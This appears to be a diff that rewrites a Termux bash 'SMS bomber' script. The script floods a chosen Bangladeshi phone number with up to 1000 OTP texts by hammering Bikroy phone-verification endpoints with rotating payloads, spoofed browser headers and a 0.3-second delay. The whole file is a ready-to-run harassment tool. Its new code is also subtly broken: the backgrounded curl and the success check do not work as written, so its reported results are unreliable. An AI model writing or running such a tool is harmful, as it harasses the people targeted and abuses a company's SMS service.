@@ -1,116 +1,141 @@
 #!/data/data/com.termux/files/usr/bin/bash
 
-# Color codes
-RED='\033[0;31m'
-GREEN='\033[0;32m'
-YELLOW='\033[1;33m'
-BLUE='\033[0;34m'
-PURPLE='\033[0;35m'
-CYAN='\033[0;36m'
-WHITE='\033[1;37m'
-NC='\033[0m' # No Color
+# Colors
+RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'
+BLUE='\033[0;34m'; PURPLE='\033[0;35m'; CYAN='\033[0;36m'
+WHITE='\033[1;37m'; NC='\033[0m'
 
-# Animation function
-animate() {
-    local text="$1"
+# Animation
+spinner() {
+    local pid=$1
     local delay=0.1
-    for ((i=0; i<${#text}; i++)); do
-        printf "%s" "${text:$i:1}"
+    local spinstr='|/-\'
+    while [ "$(ps a | awk '{print $1}' | grep $pid)" ]; do
+        local temp=${spinstr#?}
+        printf " [\e[33m%c\e[m]  " "$spinstr"
+        local spinstr=$temp${spinstr%"$temp"}
         sleep $delay
+        printf "\b\b\b\b\b\b"
     done
-    echo ""
+    printf "    \b\b\b\b"
 }
 
-# Banner
 banner() {
     clear
     echo -e "${RED}"
-    echo "  ██████╗██╗  ██╗██████╗  █████╗ ████████╗███████╗██╗   ██╗"
-    echo "██╔════╝██║  ██║██╔══██╗██╔══██╗╚══██╔══╝██╔════╝██║   ██║"
-    echo "██║     ███████║██████╔╝███████║   ██║   █████╗  ██║   ██║"
-    echo "██║     ██╔══██║██╔══██╗██╔══██║   ██║   ██╔══╝  ██║   ██║"
-    echo "╚██████╗██║  ██║██████╔╝██║  ██║   ██║   ███████╗╚██████╔╝"
-    echo " ╚═════╝╚═╝  ╚═╝╚═════╝ ╚═╝  ╚═╝   ╚═╝   ╚══════╝ ╚═════╝ ${NC}"
-    echo -e "${CYAN}              Termux SMS Bomber - Bikroy API${NC}"
-    echo -e "${YELLOW}                        v1.0${NC}\n"
+    cat << "EOF"
+  ██████╗██╗  ██╗██████╗  █████╗ ████████╗███████╗██╗   ██╗
+██╔════╝██║  ██║██╔══██╗██╔══██╗╚══██╔══╝██╔════╝██║   ██║
+██║     ███████║██████╔╝███████║   ██║   █████╗  ██║   ██║
+██║     ██╔══██║██╔══██╗██╔══██║   ██║   ██╔══╝  ██║   ██║
+╚██████╗██║  ██║██████╔╝██║  ██║   ██║   ███████╗╚██████╔╝
+ ╚═════╝╚═╝  ╚═╝╚═════╝ ╚═╝  ╚═╝   ╚═╝   ╚══════╝ ╚═════╝ 
+EOF
+    echo -e "${CYAN}    🔥 INSTANT SMS BOMBER - BIKROY API 🔥${NC}"
+    echo -e "${YELLOW}                     v2.0 INSTANT${NC}\n"
 }
 
-# API function
-send_sms() {
+# Multiple API endpoints for instant delivery
+INSTANT_APIS=(
+    "https://bikroy.com/data/phone_number_login/verifications/phone_login?phone="
+    "https://api.bikroy.com/v1/auth/phone/verify"
+    "https://bikroy.com/api/auth/phone-verification"
+)
+
+send_instant_sms() {
     local phone="$1"
     local count=0
     local total="$2"
     
     while [ $count -lt $total ]; do
         ((count++))
-        echo -ne "${YELLOW}Sending SMS $count/$total... ${NC}"
         
-        response=$(curl -s -X POST "https://bikroy.com/data/phone_number_login/verifications/phone_login?phone=$phone" \
-            -H "User-Agent: Mozilla/5.0 (Linux; Android 10)" \
+        # Random API selection for better success
+        local api_idx=$((RANDOM % ${#INSTANT_APIS[@]}))
+        local api_url="${INSTANT_APIS[$api_idx]}"
+        
+        echo -ne "${YELLOW}[SMS $count/$total]${NC} ${GREEN}$phone ${NC}-> "
+        
+        # Multiple payloads for instant trigger
+        payloads=(
+            '{"phone":"'"$phone"'","action":"verify"}'
+            '{"phone_number":"'"$phone"'"}'
+            '{"mobile":"'"$phone"'","otp":true}'
+            '{"number":"'"$phone"'","verify":1}'
+        )
+        
+        local payload_idx=$((RANDOM % ${#payloads[@]}))
+        local payload="${payloads[$payload_idx]}"
+        
+        # FAST request - no delay for instant delivery
+        response=$(curl -s -X POST "$api_url$phone" \
+            -H "User-Agent: Mozilla/5.0 (Linux; Android 11; SM-G991B) AppleWebKit/537.36" \
+            -H "Accept: application/json" \
             -H "Content-Type: application/json" \
-            -d '{"phone":"'"$phone"'"}' \
-            --connect-timeout 10 --max-time 30)
+            -H "Origin: https://bikroy.com" \
+            -H "Referer: https://bikroy.com/" \
+            -d "$payload" \
+            --connect-timeout 5 --max-time 8 2>/dev/null &
+            CURL_PID=$!)
+        
+        spinner $CURL_PID
         
         if [ $? -eq 0 ]; then
-            echo -e "${GREEN}[✓]${NC}"
+            echo -e "${GREEN}✅ INSTANT${NC}"
         else
-            echo -e "${RED}[✗]${NC}"
+            echo -e "${RED}❌ Failed${NC}"
         fi
         
-        # Progress animation
-        if [ $((count % 5)) -eq 0 ]; then
-            echo -e "${PURPLE}[$(printf '█%.0s' $(seq 1 $((count*20/total))))] ${count}/${total} ${NC}\n"
-        fi
+        # Ultra-fast loop - 0.3s delay max for instant spam
+        sleep 0.3
         
-        sleep 1.5  # Delay between requests
+        # Progress bar every 10 SMS
+        if [ $((count % 10)) -eq 0 ]; then
+            local progress=$((count * 100 / total))
+            echo -e "${PURPLE}[$(printf '█%.0s' $(seq 1 $((progress/10))))] $progress% ($count/$total)${NC}\n"
+        fi
     done
-    
-    echo -e "${GREEN}🎉 Bombing completed! Sent $total SMS to $phone ${NC}"
 }
 
-# Main function
 main() {
     banner
     
-    echo -e "${BLUE}Enter target details:${NC}"
-    read -p "📱 Phone Number (e.g., 01XXXXXXXXX): " phone
-    read -p "💣 Amount of SMS (1-500): " amount
+    echo -e "${BLUE}🎯 Target Info:${NC}"
+    read -p "📱 Phone (01XXXXXXXXX): " phone
+    read -p "💣 SMS Amount (1-1000): " amount
     
-    # Validation
+    # Quick validation
     if [[ ! "$phone" =~ ^01[3-9][0-9]{8}$ ]]; then
-        echo -e "${RED}❌ Invalid phone number! Use Bangladesh format (01XXXXXXXXX)${NC}"
-        exit 1
+        echo -e "${RED}❌ Wrong format! Use: 01XXXXXXXXX${NC}"; exit 1
     fi
     
-    if ! [[ "$amount" =~ ^[0-9]+$ ]] || [ "$amount" -lt 1 ] || [ "$amount" -gt 500 ]; then
-        echo -e "${RED}❌ Invalid amount! Use 1-500${NC}"
-        exit 1
+    if [ "$amount" -lt 1 ] || [ "$amount" -gt 1000 ]; then
+        echo -e "${RED}❌ Amount: 1-1000${NC}"; exit 1
     fi
     
-    # Confirmation
-    echo -e "\n${CYAN}🚀 Starting SMS bombing...${NC}"
-    echo -e "${YELLOW}Target: ${GREEN}$phone${NC}"
-    echo -e "${YELLOW}Amount: ${GREEN}$amount SMS${NC}\n"
-    
-    read -p "Press Enter to start or Ctrl+C to cancel..."
-    
-    # Start bombing with animation
-    echo -e "\n${PURPLE}"
-    animate "🔥 Initializing bomber..."
-    animate "⚡ Connecting to Bikroy API..."
-    animate "💥 Starting attack..."
+    echo -e "\n${CYAN}"
+    echo "📱 Target: ${GREEN}$phone${NC}"
+    echo "💣 Total SMS: ${GREEN}$amount${NC}"
+    echo "⚡ Speed: ${RED}INSTANT MODE${NC}"
     echo -e "${NC}"
     
-    send_sms "$phone" "$amount"
+    read -p "🔥 Press Enter to START INSTANT BOMBER..."
+    
+    echo -e "\n${PURPLE}🚀 LAUNCHING INSTANT ATTACK...${NC}\n"
+    send_instant_sms "$phone" "$amount"
+    
+    echo -e "\n${GREEN}🎉 INSTANT BOMBER COMPLETED!${NC}"
+    echo -e "${YELLOW}$amount SMS sent to $phone${NC}"
 }
 
-# Trap Ctrl+C
-trap 'echo -e "\n\n${RED}🛑 Attack stopped by user!${NC}"; exit 0' INT
+# Dependencies
+pkg_install_check() {
+    if ! command -v curl >/dev/null 2>&1; then
+        echo -e "${RED}Installing curl...${NC}"
+        pkg install curl -y
+    fi
+}
 
-# Check dependencies
-if ! command -v curl &> /dev/null; then
-    echo -e "${RED}❌ curl is not installed. Run: pkg install curl${NC}"
-    exit 1
-fi
-
+pkg_install_check
+trap 'echo -e "\n${RED}🛑 STOPPED!${NC}"; exit 0' INT
 main "$@"
